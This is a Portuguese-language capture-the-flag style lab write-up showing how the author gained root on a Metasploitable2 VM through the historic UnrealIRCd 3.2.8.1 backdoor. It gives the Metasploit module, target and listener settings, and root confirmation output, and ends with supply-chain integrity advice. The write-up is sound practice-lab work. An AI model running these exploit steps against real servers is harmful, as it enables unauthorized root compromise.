# Writeup: Exploração UnrealIRCd 3.2.8.1 Backdoor - Metasploitable2

## Ambiente
- Atacante: Kali Linux (VM VirtualBox)
- Alvo: Metasploitable2 (VM VirtualBox)
- Rede: Internal Network isolada (192.168.56.0/24)

## 1. Reconhecimento
Identificado durante a varredura inicial com Nmap (mesmo scan do
writeup anterior): UnrealIRCd rodando na porta 6667/tcp.

## 2. Identificação da vulnerabilidade
A versão UnrealIRCd 3.2.8.1 distribuída possuía um backdoor
inserido maliciosamente no código-fonte oficial (descoberto em
2010), permitindo execução remota de comandos através do
protocolo IRC.

## 3. Exploração
Uso do módulo do Metasploit Framework:

    use exploit/unix/irc/unreal_ircd_3281_backdoor
    set RHOSTS 192.168.56.10
    set LHOST 192.168.56.11
    exploit

Diferente do exploit do vsftpd (que ataca diretamente o
protocolo FTP), esse exploit primeiro registra um usuário de
IRC legítimo no servidor e, através dessa conexão já
estabelecida, envia o comando de backdoor embutido no protocolo
IRC.

Resultado: sessão Meterpreter aberta com sucesso.

## 4. Confirmação de acesso
    getuid          -> root
    whoami          -> root
    id              -> uid=0(root) gid=0(root)

## Observação técnica
Durante a prática, o IP configurado manualmente nas VMs (rede
interna sem DHCP) se perdeu após reinicialização das máquinas,
causando erro "HostUnreachable". Resolvido reatribuindo o IP
manualmente com `ip addr add` (Kali) e `ifconfig` (Metasploitable2).

## Conclusão
Acesso root obtido explorando um backdoor histórico conhecido,
inserido via comprometimento da cadeia de distribuição do
software (supply chain attack). Como correção: sempre verificar
a integridade/hash de binários baixados de fontes oficiais, e
manter serviços atualizados.
